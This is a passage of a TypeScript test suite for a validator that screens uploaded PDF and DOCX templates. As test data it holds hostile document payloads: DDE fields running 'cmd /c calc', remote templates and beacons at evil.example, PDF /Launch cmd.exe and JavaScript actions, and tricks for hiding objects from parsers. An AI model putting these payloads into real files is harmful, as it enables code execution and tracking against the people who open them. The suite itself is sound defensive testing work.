import { BadRequestException, UnsupportedMediaTypeException } from '@nestjs/common';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { deflateRawSync, deflateSync } from 'node:zlib';
import PDFDocument from 'pdfkit';
import {
  docxEntidadFueraDeRango, ensamblarPdf, pdfActualizacionIncremental, pdfCabeceraConComentarios, pdfCifrado, pdfIccBasado, pdfLinealizado, pdfLongitudDirectaInexacta,
  pdfLongitudIndirecta, pdfLongitudIndirectaEndstreamFalso, pdfModernoBenigno, pdfObjetoOculto, pdfObjStmSinType, pdfObjStmSoloN, streamDeObjetos,
} from '../../test/fixtures/attack/archivos-maliciosos.mjs';
import { validatePlantillaFile, DOCX_MIME, PDF_MIME, PLANTILLA_PAT_MAX_BYTES } from './plantilla-pat-file.validator.js';

const CRC = Array.from({ length: 256 }, (_, n) => {
  let c = n;
  for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  return c >>> 0;
});
const crc32 = (data: Buffer) => { let crc = 0xffffffff; for (const byte of data) crc = CRC[(crc ^ byte) & 0xff]! ^ (crc >>> 8); return (crc ^ 0xffffffff) >>> 0; };

/** PNG RGB (o RGBA con `alfa`) con un degradado, para incrustar imágenes con pdfkit. */
function png(ancho: number, alto: number, alfa = false): Buffer {
  const canales = alfa ? 4 : 3;
  const filas = Buffer.alloc((ancho * canales + 1) * alto);
  for (let y = 0; y < alto; y += 1) for (let x = 0; x < ancho; x += 1) {
    const base = y * (ancho * canales + 1) + 1 + x * canales;
    filas[base] = (x * 255) / ancho; filas[base + 1] = (y * 255) / alto; filas[base + 2] = 128;
    if (alfa) filas[base + 3] = 200;
  }
  const bloque = (tipo: string, datos: Buffer) => {
    const cuerpo = Buffer.concat([Buffer.from(tipo, 'latin1'), datos]);
    const largo = Buffer.alloc(4); largo.writeUInt32BE(datos.length);
    const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(cuerpo));
    return Buffer.concat([largo, cuerpo, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(ancho, 0); ihdr.writeUInt32BE(alto, 4); ihdr[8] = 8; ihdr[9] = alfa ? 6 : 2;
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), bloque('IHDR', ihdr), bloque('IDAT', deflateSync(filas)), bloque('IEND', Buffer.alloc(0))]);
}

/** `almacenado`: entradas sin compresión (método 0), para contenidos repetitivos que superarían la razón de compresión permitida. */
function docx(entries: Array<[string, string]>, { almacenado = false } = {}): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let localOffset = 0;
  const method = almacenado ? 0 : 8;
  for (const [name, contents] of entries) {
    const fileName = Buffer.from(name);
    const data = Buffer.from(contents);
    const compressed = almacenado ? data : deflateRawSync(data);
    const local = Buffer.alloc(30 + fileName.length);
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(8, 6);
    local.writeUInt16LE(method, 8); local.writeUInt32LE(compressed.length, 18); local.writeUInt32LE(data.length, 22); local.writeUInt16LE(fileName.length, 26);
    fileName.copy(local, 30); locals.push(local, compressed);
    const central = Buffer.alloc(46 + fileName.length);
    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6); central.writeUInt16LE(8, 8); central.writeUInt16LE(method, 10);
    central.writeUInt32LE(compressed.length, 20); central.writeUInt32LE(data.length, 24); central.writeUInt16LE(fileName.length, 28); central.writeUInt32LE(localOffset, 42);
    fileName.copy(central, 46); centrals.push(central); localOffset += local.length + compressed.length;
  }
  const centralDirectory = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10); end.writeUInt32LE(centralDirectory.length, 12); end.writeUInt32LE(localOffset, 16);
  return Buffer.concat([...locals, centralDirectory, end]);
}

function file(name: string, mimetype: string, buffer: Buffer): Express.Multer.File {
  return { originalname: name, mimetype, buffer, size: buffer.length } as Express.Multer.File;
}

describe('validación de archivos de plantilla PAT', () => {
  it('acepta un PDF con cabecera y cierre', () => {
    const result = validatePlantillaFile(file('plantilla.PDF', PDF_MIME, Buffer.from('%PDF-1.7\ncontenido\n%%EOF')));
    expect(result.extension).toBe('pdf');
    expect(result.fileName).toBe('plantilla.PDF');
  });

  it('acepta un DOCX comprimido con los componentes mínimos de Word', () => {
    const valid = docx([
      ['[Content_Types].xml', '<Types><Override ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'],
      ['_rels/.rels', '<Relationships/>'],
      ['word/document.xml', '<w:document xmlns:w="urn:word"><w:body/></w:document>'],
    ]);
    expect(validatePlantillaFile(file('plantilla.docx', DOCX_MIME, valid)).extension).toBe('docx');
  });

  it('rechaza contenido renombrado, tipos no admitidos, rutas, cierres incompletos y tamaños excedidos', () => {
    expect(() => validatePlantillaFile(file('falso.pdf', PDF_MIME, Buffer.from('no es pdf')))).toThrow(BadRequestException);
    expect(() => validatePlantillaFile(file('archivo.txt', 'text/plain', Buffer.from('texto')))).toThrow(UnsupportedMediaTypeException);
    expect(() => validatePlantillaFile(file('../plantilla.pdf', PDF_MIME, Buffer.from('%PDF-1.7\n%%EOF')))).toThrow(BadRequestException);
    expect(() => validatePlantillaFile(file('incompleto.pdf', PDF_MIME, Buffer.from('%PDF-1.7')))).toThrow(BadRequestException);
    expect(() => validatePlantillaFile(file('grande.pdf', PDF_MIME, Buffer.alloc(PLANTILLA_PAT_MAX_BYTES + 1)))).toThrow(BadRequestException);
  });

  it('acepta un archivo exactamente en el límite de 10 MiB', () => {
    const maximum = Buffer.alloc(PLANTILLA_PAT_MAX_BYTES, 0x20);
    maximum.write('%PDF-1.7\n', 0);
    maximum.write('%%EOF', maximum.length - 5);
    expect(validatePlantillaFile(file('limite.pdf', PDF_MIME, maximum)).extension).toBe('pdf');
  });

  it('rechaza ZIP corrupto, macros y DOCX que no es un documento Word', () => {
    expect(() => validatePlantillaFile(file('no-valido.docx', DOCX_MIME, Buffer.from('PK')))).toThrow(BadRequestException);
    const macro = docx([
      ['[Content_Types].xml', '<Types><Override ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'],
      ['_rels/.rels', '<Relationships/>'], ['word/document.xml', '<w:document/>'], ['word/vbaProject.bin', 'macro'],
    ]);
    expect(() => validatePlantillaFile(file('macro.docx', DOCX_MIME, macro))).toThrow(BadRequestException);
    const wrong = docx([['[Content_Types].xml', '<Types/>'], ['_rels/.rels', '<Relationships/>'], ['word/document.xml', '<w:document/>']]);
    expect(() => validatePlantillaFile(file('renombrado.docx', DOCX_MIME, wrong))).toThrow(BadRequestException);
  });

  describe('contenido activo', () => {
    const CONTENT_TYPES = '<Types><Override ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>';
    const word = (body: string, extra: Array<[string, string]> = []) => docx([
      ['[Content_Types].xml', CONTENT_TYPES], ['_rels/.rels', '<Relationships/>'],
      ['word/document.xml', `<w:document xmlns:w="urn:word"><w:body>${body}</w:body></w:document>`], ...extra,
    ]);
    const rels = (relationship: string) => ['word/_rels/document.xml.rels', `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${relationship}</Relationships>`] as [string, string];
    const HYPERLINK = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink';
    const docxOk = (buffer: Buffer) => expect(validatePlantillaFile(file('pat.docx', DOCX_MIME, buffer)).extension).toBe('docx');
    const docxRechazado = (buffer: Buffer) => expect(() => validatePlantillaFile(file('pat.docx', DOCX_MIME, buffer))).toThrow(BadRequestException);
    const pdf = (body: string) => Buffer.from(`%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R ${body} >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n`, 'latin1');
    const pdfOk = (buffer: Buffer) => expect(validatePlantillaFile(file('pat.pdf', PDF_MIME, buffer)).extension).toBe('pdf');
    const pdfRechazado = (buffer: Buffer) => expect(() => validatePlantillaFile(file('pat.pdf', PDF_MIME, buffer))).toThrow(BadRequestException);

    it('admite hipervínculos http(s) en DOCX', () => {
      docxOk(word('<w:p/>', [rels(`<Relationship Id="rId5" Type="${HYPERLINK}" Target="https://repositorio.uleam.edu.ec/tesis?id=1&amp;v=2" TargetMode="External"/>`)]));
      docxOk(word('<w:p/>', [rels(`<Relationship TargetMode='External' Target='http://example.org' Type='${HYPERLINK}' Id='rId6'/>`)]));
    });

    it('rechaza relaciones externas que no son hipervínculos http(s)', () => {
      docxRechazado(word('<w:p/>', [rels(`<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>`)]));
      docxRechazado(word('<w:p/>', [rels(`<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://evil.example/beacon.png" TargetMode="&#69;xternal"/>`)]));
      docxRechazado(word('<w:p/>', [rels(`<Relationship Id="rId9" Type="${HYPERLINK}" Target="file://servidor/compartido/x.exe" TargetMode="External"/>`)]));
      docxRechazado(word('<w:p/>', [rels(`<Relationship Id="rId9" Type="${HYPERLINK}" Target="\\\\servidor\\x" TargetMode="External"/>`)]));
    });

    it('rechaza objetos OLE/ActiveX y campos DDE, también en encabezados o con entidades', () => {
      docxRechazado(word('<w:p/>', [['word/embeddings/oleObject1.bin', 'ole']]));
      docxRechazado(word('<w:p/>', [['word/activeX/activeX1.xml', '<ax/>']]));
      docxRechazado(word('<w:p><w:fldSimple w:instr=" DDE cmd &quot;/c calc&quot;"/></w:p>'));
      docxRechazado(word('<w:p/>', [['word/header1.xml', '<w:hdr><w:r><w:instrText>D&#68;EAUTO c:\\\\x.exe</w:instrText></w:r></w:hdr>']]));
    });

    it('[VAL-003] rechaza con 400 (no 500) referencias numéricas de carácter fuera del rango Unicode', () => {
      for (const referencia of ['&#x110000;', '&#9999999;', '&#99999999999999999999;', '&#xFFFFFFFFFFFFFFFFFFFF;']) {
        docxRechazado(word(`<w:p><w:r><w:instrText> PAGE ${referencia} </w:instrText></w:r></w:p>`));
        docxRechazado(word('<w:p/>', [rels(`<Relationship Id="rId5" Type="${HYPERLINK}" Target="https://a.org/${referencia}" TargetMode="External"/>`)]));
      }
      docxRechazado(docxEntidadFueraDeRango());
    });

    it('decodifica referencias numéricas válidas, incluido el último punto de código', () => {
      docxOk(word('<w:p><w:r><w:instrText> PAGE &#x10FFFF; &#1114111; &#233; </w:instrText></w:r></w:p>'));
      docxRechazado(word('<w:p><w:r><w:instrText> &#68;&#x44;E c:\\x.exe </w:instrText></w:r></w:p>'));
    });

    it('admite campos ordinarios de Word', () => {
      docxOk(word('<w:p><w:r><w:instrText xml:space="preserve"> PAGE \\* MERGEFORMAT </w:instrText></w:r><w:r><w:instrText> HYPERLINK "https://a.org/ADDE" </w:instrText></w:r></w:p>'));
    });

    it('rechaza acciones activas del PDF, incluidos nombres con escapes hexadecimales', () => {
      pdfRechazado(pdf('/Names << /JavaScript 4 0 R >>'));
      pdfRechazado(pdf('/OpenAction 4 0 R'));
      pdfRechazado(pdf('/OpenAction << /S /URI /URI (http://evil.example) >>'));
      pdfRechazado(pdf('/AA << /O 4 0 R >>'));
      pdfRechazado(pdf('/Names << /J#61vaScript 4 0 R >>'));
      pdfRechazado(pdf('/x << /S /L#61unch /F (cmd.exe) >>'));
      pdfRechazado(pdf('/Names << /EmbeddedFiles 4 0 R >>'));
      pdfRechazado(pdf('/x << /Subtype /RichMedia >>'));
    });

    it('admite una vista inicial /OpenAction con destino y enlaces /URI', () => {
      pdfOk(pdf('/OpenAction [3 0 R /Fit]'));
      pdfOk(pdf('/x << /Type /Annot /Subtype /Link /A << /S /URI /URI (https://uleam.edu.ec) >> >>'));
    });

    it('inspecciona los streams de objetos comprimidos y no confunde datos binarios con nombres', () => {
      const oculto = deflateSync(Buffer.from('4 0 << /S /JavaScript /JS (app.alert(1)) >>', 'latin1'));
      const conObjStm = Buffer.concat([
        Buffer.from(`%PDF-1.7\n5 0 obj << /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ${oculto.length} >> stream\n`, 'latin1'),
        oculto, Buffer.from('\nendstream endobj\ntrailer << >>\n%%EOF\n', 'latin1'),
      ]);
      pdfRechazado(conObjStm);
      const binario = Buffer.concat([Buffer.from('%PDF-1.7\n6 0 obj << /Length 8 >> stream\n', 'latin1'), Buffer.from('/AA /JS ', 'latin1'), Buffer.from('\nendstream endobj\n%%EOF\n', 'latin1')]);
      pdfOk(binario);
    });

    const objStm = (contenido: string, diccionarioExtra = '') => {
      const datos = deflateSync(Buffer.from(contenido, 'latin1'));
      return Buffer.concat([
        Buffer.from(`%PDF-1.7\n5 0 obj\n<< /Type /ObjStm /N 1 /First 4 ${diccionarioExtra} /Filter /FlateDecode /Length ${datos.length} >>\nstream\n`, 'latin1'),
        datos, Buffer.from('\nendstream\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\n', 'latin1'),
      ]);
    };

    it('inspecciona un /ObjStm aunque su diccionario supere los 4096 caracteres', () => {
      const relleno = `/Relleno (${'x'.repeat(6000)}) /Otro [${'0 '.repeat(2000)}]`;
      pdfRechazado(objStm('4 0 << /S /JavaScript /JS (app.alert(1)) >>', relleno));
      pdfRechazado(objStm('4 0 << /S /JavaScript /JS (app.alert(1)) >>', `/Comentario (<<) ${relleno} (>>)`));
    });

    it('aplica todas las reglas al contenido descomprimido de los streams de objetos', () => {
      pdfRechazado(objStm('4 0 << /S /Launch /F (cmd.exe) >>'));
      pdfRechazado(objStm('4 0 << /Type /Filespec /EF << /F 6 0 R >> /Type /EmbeddedFile >>'));
      pdfRechazado(objStm('4 0 << /Names << /EmbeddedFiles 7 0 R >> >>'));
      pdfRechazado(objStm('4 0 << /Subtype /RichMedia >>'));
      pdfRechazado(objStm('4 0 << /AA << /O 8 0 R >> >>'));
      pdfRechazado(objStm('4 0 << /OpenAction 9 0 R >>'));
    });

    it('rechaza streams sin cierre y streams de objetos que no se pueden delimitar o descomprimir', () => {
      pdfRechazado(Buffer.from('%PDF-1.7\n1 0 obj << /Length 4 >>\nstream\nabcd\n%%EOF\n', 'latin1'));
      pdfRechazado(Buffer.from('%PDF-1.7\n5 0 obj << /Type /ObjStm /Filter /DCTDecode /Length 4 >>\nstream\nabcd\nendstream endobj\n%%EOF\n', 'latin1'));
      pdfRechazado(Buffer.from('%PDF-1.7\n5 0 obj << /Type /ObjStm /Filter /FlateDecode /Length 4 >>\nstream\nabcd\nendstream endobj\n%%EOF\n', 'latin1'));
      pdfRechazado(Buffer.from('%PDF-1.7\n5 0 obj << /Type /Obj#53tm /Filter /DCTDecode >>\nstream\nabcd\nendstream endobj\n%%EOF\n', 'latin1'));
    });

    it('acepta un PDF moderno con streams de objetos, stream de referencias y contenido comprimido', () => {
      const objetos = '2 0 3 60 '.padEnd(12) + '<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n<< /Type /Page /Parent 2 0 R /Contents 6 0 R /Annots [<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://uleam.edu.ec) >> >>] >>';
      const comprimido = deflateSync(Buffer.from(objetos, 'latin1'));
      const contenido = deflateSync(Buffer.from('BT /F1 12 Tf 72 712 Td (Plan de titulacion) Tj ET', 'latin1'));
      const xref = deflateSync(Buffer.from([1, 0, 0, 2, 0, 0]));
      const moderno = Buffer.concat([
        Buffer.from('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<</Type/Catalog/Pages 2 0 R/OpenAction[3 0 R/Fit]>>\nendobj\n', 'latin1'),
        Buffer.from(`5 0 obj\n<</Type/ObjStm/N 2/First 12/Filter/FlateDecode/Length ${comprimido.length}>>\nstream\r\n`, 'latin1'), comprimido, Buffer.from('\r\nendstream\nendobj\n', 'latin1'),
        Buffer.from(`6 0 obj\n<</Filter/FlateDecode/Length ${contenido.length}>>\nstream\n`, 'latin1'), contenido, Buffer.from('\nendstream\nendobj\n', 'latin1'),
        Buffer.from(`7 0 obj\n<</Type/XRef/Size 8/W[1 2 2]/Root 1 0 R/Filter/FlateDecode/Length ${xref.length}>>\nstream\n`, 'latin1'), xref, Buffer.from('\nendstream\nendobj\nstartxref\n0\n%%EOF\n', 'latin1'),
      ]);
      pdfOk(moderno);
    });

    it('acepta un DOCX almacenado con hipervínculos y campos ordinarios', () => {
      const cuerpo = '<w:p><w:fldSimple w:instr=" PAGE "/><w:r><w:instrText xml:space="preserve"> TOC \\o "1-3" </w:instrText></w:r><w:r><w:instrText/></w:r></w:p>';
      const documento = docx([
        ['[Content_Types].xml', CONTENT_TYPES], ['_rels/.rels', '<Relationships/>'],
        ['word/document.xml', `<w:document xmlns:w="urn:word"><w:body>${cuerpo}</w:body></w:document>`],
        rels(`<Relationship Id="rId1" Type="${HYPERLINK}" Target="https://a.org/x?y=1&amp;z=2" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>`),
      ], { almacenado: true });
      docxOk(documento);
    });
  });

  describe('diferencial entre lector y validador PDF (VAL-001, VAL-002)', () => {
    const pdfOk = (buffer: Buffer) => expect(validatePlantillaFile(file('pat.pdf', PDF_MIME, buffer)).extension).toBe('pdf');
    const pdfRechazado = (buffer: Buffer) => expect(() => validatePlantillaFile(file('pat.pdf', PDF_MIME, buffer))).toThrow(BadRequestException);

    it('[VAL-001] rechaza un /ObjStm oculto tras un endstream falso en un stream con /Length indirecto', () => {
      pdfRechazado(pdfLongitudIndirectaEndstreamFalso());
    });

    it('[VAL-002] rechaza streams de objetos sin /Type /ObjStm directo (solo /N y /First, o /Type indirecto)', () => {
      pdfRechazado(pdfObjStmSinType('sin-type'));
      pdfRechazado(pdfObjStmSinType('type-indirecto'));
      const conExtends = ensamblarPdf([
        '%PDF-1.7\n', { objeto: 1 }, '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Names 8 0 R >>\nendobj\n',
        ...streamDeObjetos(7, [[8, '<< /AA << /O 9 0 R >> >>']], '/Extends 10 0 R').abierto, '\nendstream\nendobj\n',
      ], { xref: 'stream' });
      const sinFirst = Buffer.from(conExtends.toString('latin1').replace(/\/First \d+ /, ''), 'latin1');
      pdfRechazado(sinFirst);
    });

    it('rechaza un objeto escondido en los datos de un stream, una cadena o un comentario', () => {
      pdfRechazado(pdfObjetoOculto({ donde: 'stream', accion: 'openaction' }));
      pdfRechazado(pdfObjetoOculto({ donde: 'stream', accion: 'aa' }));
      pdfRechazado(pdfObjetoOculto({ donde: 'cadena' }));
      pdfRechazado(pdfObjetoOculto({ donde: 'comentario' }));
    });

    it('rechaza cabeceras escondidas escritas con comentarios o espacios inusuales entre sus tokens', () => {
      pdfRechazado(pdfObjetoOculto({ cabecera: '8 %x\n 0 obj' }));
      pdfRechazado(pdfObjetoOculto({ cabecera: '8\r\n\f0\t\x00obj' }));
      pdfRechazado(pdfObjetoOculto({ cabecera: '8\x0b0\xa0obj' }));
    });

    it('exige que /Length delimite el stream exactamente', () => {
      pdfRechazado(pdfLongitudDirectaInexacta());
      pdfRechazado(pdfLongitudIndirecta('falta'));
      pdfRechazado(pdfLongitudIndirecta('no-entero'));
      pdfRechazado(pdfLongitudIndirecta('negativo'));
      pdfRechazado(pdfLongitudIndirecta('referencia'));
      pdfRechazado(pdfLongitudIndirecta('duplicado-distinto'));
      pdfRechazado(Buffer.from('%PDF-1.7\n1 0 obj << >>\nstream\nabcd\nendstream endobj\n%%EOF\n', 'latin1'));
    });

    it('acepta /Length indirecto resuelto, también repetido con el mismo valor por una actualización', () => {
      pdfOk(pdfLongitudIndirecta('correcto'));
      pdfOk(pdfLongitudIndirecta('duplicado-igual'));
    });

    it('acepta PDF benignos: moderno (1.5), actualización incremental, linealizado y cabecera con comentarios', () => {
      pdfOk(pdfModernoBenigno());
      pdfOk(pdfActualizacionIncremental());
      pdfOk(pdfLinealizado());
      pdfOk(pdfCabeceraConComentarios());
    });

    it('inspecciona un stream de objetos sin filtro', () => {
      const plano = (objeto: string) => {
        const cuerpo = `8 0 ${objeto}\n`;
        return ensamblarPdf([
          '%PDF-1.7\n', { objeto: 1 }, '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n',
          { comprimido: 8, en: 7, indice: 0 }, { objeto: 7 }, `7 0 obj\n<< /Type /ObjStm /N 1 /First 6 /Length ${cuerpo.length} >>\nstream\n${cuerpo}\nendstream\nendobj\n`,
        ], { xref: 'stream' });
      };
      pdfOk(plano('<< /Type /Pages /Kids [] /Count 0 >>'));
      pdfRechazado(plano('<< /AA << /O 9 0 R >> >>'));
    });

    /** Una página cuyo stream de contenido lleva `operadores`, comprimido o sin comprimir. */
    const pdfConContenido = (operadores: string, comprimir: boolean) => {
      const datos = comprimir ? deflateSync(Buffer.from(operadores, 'latin1')) : Buffer.from(operadores, 'latin1');
      return ensamblarPdf([
        '%PDF-1.7\n', { objeto: 1 }, '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n',
        { objeto: 2 }, '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n',
        { objeto: 3 }, '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n',
        { objeto: 4 }, `4 0 obj\n<< ${comprimir ? '/Filter /FlateDecode ' : ''}/Length ${datos.length} >>\nstream\n`, datos, '\nendstream\nendobj\n',
      ]);
    };

    const pdfCifradoRechazado = (buffer: Buffer) => expect(() => validatePlantillaFile(file('pat.pdf', PDF_MIME, buffer))).toThrow(/cifrado o protegido con contraseña/);

    it('[V2-001] rechaza PDF cifrados: /Encrypt en el trailer, con escapes hexadecimales o en un stream de referencias', () => {
      pdfCifradoRechazado(pdfCifrado('trailer'));
      pdfCifradoRechazado(pdfCifrado('hex'));
      pdfCifradoRechazado(pdfCifrado('xref-stream'));
    });

    it('[V2-001] rechaza /Encrypt dentro de un stream de objetos', () => {
      const conEncrypt = ensamblarPdf([
        '%PDF-1.7\n', { objeto: 1 }, '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n',
        ...streamDeObjetos(7, [[8, '<< /Size 9 /Root 1 0 R /Encrypt 9 0 R >>']]).abierto, '\nendstream\nendobj\n',
      ], { xref: 'stream' });
      pdfCifradoRechazado(conEncrypt);
    });

    it('[V2-001] admite la palabra Encrypt en el texto y /EncryptMetadata sin /Encrypt', () => {
      pdfOk(pdfConContenido('BT /F1 12 Tf 72 712 Td (Encrypt) Tj ET', false));
      pdfOk(pdfConContenido('BT /F1 12 Tf 72 712 Td (Encrypt) Tj ET', true));
      pdfOk(pdfConContenido('BT /F1 12 Tf 72 712 Td (/Encrypt) Tj ET', true));
      pdfOk(ensamblarPdf(['%PDF-1.7\n', { objeto: 1 }, '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /EncryptMetadata false >>\nendobj\n']));
    });

    it('[V2-001] regla conservadora: el nombre /Encrypt en un stream de contenido sin comprimir rechaza el archivo', () => {
      pdfCifradoRechazado(pdfConContenido('BT /F1 12 Tf 72 712 Td (/Encrypt) Tj ET', false));
    });

    it('[V2-002] inspecciona un stream de objetos identificado solo por /N (sin /First ni /Type)', () => {
      const rechazadoPor = (buffer: Buffer, motivo: RegExp) => expect(() => validatePlantillaFile(file('pat.pdf', PDF_MIME, buffer))).toThrow(motivo);
      rechazadoPor(pdfObjStmSoloN({ filtro: 'flate', accion: 'javascript' }), /JavaScript/);
      rechazadoPor(pdfObjStmSoloN({ filtro: 'flate', accion: 'uri' }), /OpenAction/);
      rechazadoPor(pdfObjStmSoloN({ filtro: 'ninguno', accion: 'uri' }), /OpenAction/);
      pdfRechazado(pdfObjStmSoloN({ filtro: 'ninguno', accion: 'javascript' }));
    });

    it('[V2-002] acepta perfiles ICC (/N 3) comprimidos o sin filtro y rechaza los que usan otro filtro', () => {
      pdfOk(pdfIccBasado());
      pdfOk(pdfIccBasado({ filtro: 'ninguno' }));
      pdfOk(pdfIccBasado({ perfil: readFileSync(join(process.cwd(), 'node_modules/pdfkit/js/data/sRGB_IEC61966_2_1.icc')) }));
      pdfRechazado(pdfIccBasado({ filtro: 'lzw' }));
    });

    describe('PDF generados con pdfkit', () => {
      const generar = (opciones: PDFKit.PDFDocumentOptions, dibujar: (doc: PDFKit.PDFDocument) => void) => new Promise<Buffer>((resolve, reject) => {
        const doc = new PDFDocument(opciones);
        const partes: Buffer[] = [];
        doc.on('data', (parte: Buffer) => partes.push(parte));
        doc.on('end', () => resolve(Buffer.concat(partes)));
        doc.on('error', reject);
        dibujar(doc);
        doc.end();
      });
      const texto = (doc: PDFKit.PDFDocument) => {
        doc.info.Title = 'Plan de Actividades de Titulación';
        doc.info.Keywords = 'tabla 1 0 objetivos';
        for (let pagina = 0; pagina < 3; pagina += 1) {
          if (pagina > 0) doc.addPage();
          doc.fontSize(14).text(`Capítulo ${pagina + 1} 0 objetivos`, { underline: true });
          doc.fontSize(11).text('Lorem ipsum dolor sit amet, consectetur adipiscing elit. '.repeat(40));
          doc.text('Repositorio', { link: 'https://repositorio.uleam.edu.ec' });
        }
      };
      const conImagen = (doc: PDFKit.PDFDocument) => { texto(doc); doc.image(png(48, 32), 72, 400, { width: 96 }); doc.image(png(16, 16, true), 200, 400); };

      it.each([
        ['texto en varias páginas, comprimido', { compress: true }, texto],
        ['texto en varias páginas, sin comprimir', { compress: false }, texto],
        ['con imágenes PNG (con y sin alfa), comprimido', { compress: true }, conImagen],
        ['con imágenes PNG (con y sin alfa), sin comprimir', { compress: false }, conImagen],
        ['PDF 1.7 con contorno de documento', { compress: true, pdfVersion: '1.7' as const }, (doc: PDFKit.PDFDocument) => { texto(doc); doc.outline.addItem('Capítulo 1'); }],
        ['PDF/A-1b con perfil sRGB de intención de salida, comprimido', { compress: true, subset: 'PDF/A-1b' as const }, texto],
        ['PDF/A-1b con perfil sRGB de intención de salida, sin comprimir', { compress: false, subset: 'PDF/A-1b' as const }, texto],
      ])('%s', async (_caso, opciones, dibujar) => {
        pdfOk(await generar(opciones, dibujar));
      });

      it.each([
        ['RC4 (PDF 1.3)', {}],
        ['AES-256 (PDF 1.7 ext. 3)', { pdfVersion: '1.7ext3' as const }],
      ])('[V2-001] rechaza un PDF cifrado de verdad con contraseña de usuario vacía: %s', async (_caso, version) => {
        const cifrado = await generar({ compress: true, userPassword: '', ownerPassword: 'propietario', ...version }, texto);
        expect(() => validatePlantillaFile(file('pat.pdf', PDF_MIME, cifrado))).toThrow(/cifrado o protegido con contraseña/);
      });
    });
  });

  describe('tiempo lineal ante entradas patológicas del tamaño máximo', () => {
    const MiB = 1024 * 1024;
    const LIMITE_MS = 3000;
    const CONTENT_TYPES = '<Types><Override ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>';
    const repetir = (prefijo: string, unidad: string, sufijo: string, total: number) =>
      prefijo + unidad.repeat(Math.floor((total - prefijo.length - sufijo.length) / unidad.length)) + sufijo;
    const medir = (archivo: Express.Multer.File) => {
      const inicio = performance.now();
      try { validatePlantillaFile(archivo); } catch { /* aceptar o rechazar es indiferente: se mide el tiempo */ }
      return performance.now() - inicio;
    };

    it('PDF de 10 MiB con `stream` repetido y sin `endstream`', () => {
      const contenido = Buffer.from(repetir('%PDF-1.7\n', 'stream\n', '%%EOF', 10 * MiB), 'latin1');
      expect(medir(file('a.pdf', PDF_MIME, contenido))).toBeLessThan(LIMITE_MS);
      expect(() => validatePlantillaFile(file('a.pdf', PDF_MIME, contenido))).toThrow(BadRequestException);
    });

    it('PDF de 10 MiB con `obj<<` repetido', () => {
      const contenido = Buffer.from(repetir('%PDF-1.7\n', 'obj<<', '\n%%EOF', 10 * MiB), 'latin1');
      expect(medir(file('a.pdf', PDF_MIME, contenido))).toBeLessThan(LIMITE_MS);
    });

    it('PDF de 10 MiB con `1 0 obj ` repetido (búsqueda de cabeceras)', () => {
      const contenido = Buffer.from(repetir('%PDF-1.7\n', '1 0 obj ', '\n%%EOF', 10 * MiB), 'latin1');
      expect(medir(file('a.pdf', PDF_MIME, contenido))).toBeLessThan(LIMITE_MS);
      const enCadena = Buffer.from(repetir('%PDF-1.7\n(', '1 0 obj ', ')\n%%EOF', 10 * MiB), 'latin1');
      expect(medir(file('a.pdf', PDF_MIME, enCadena))).toBeLessThan(LIMITE_MS);
      expect(() => validatePlantillaFile(file('a.pdf', PDF_MIME, enCadena))).toThrow(BadRequestException);
    });

    it('PDF de 10 MiB con enteros seguidos de comentarios largos (búsqueda de cabeceras)', () => {
      const linea = `${'1 %'.repeat(100_000)}\n`;
      const contenido = Buffer.from(repetir('%PDF-1.7\n', `${linea}%${'x'.repeat(300_000)}\n`, '\n%%EOF', 10 * MiB), 'latin1');
      expect(medir(file('a.pdf', PDF_MIME, contenido))).toBeLessThan(LIMITE_MS);
    });

    it('PDF de 10 MiB con un stream de /Length indirecto repetido', () => {
      const contenido = Buffer.from(repetir('%PDF-1.7\n5 0 obj 4 endobj\n', '<< /Length 5 0 R >> stream\nabcd\nendstream\n', '%%EOF', 10 * MiB), 'latin1');
      expect(medir(file('a.pdf', PDF_MIME, contenido))).toBeLessThan(LIMITE_MS);
    });

    it('DOCX con document.xml de 2 MiB lleno de `<w:instrText` sin cerrar', () => {
      const contenido = docx([
        ['[Content_Types].xml', CONTENT_TYPES], ['_rels/.rels', '<Relationships/>'],
        ['word/document.xml', repetir('<w:document xmlns:w="urn:w"><w:body>', '<w:instrText ', '</w:body></w:document>', 2 * MiB - 64)],
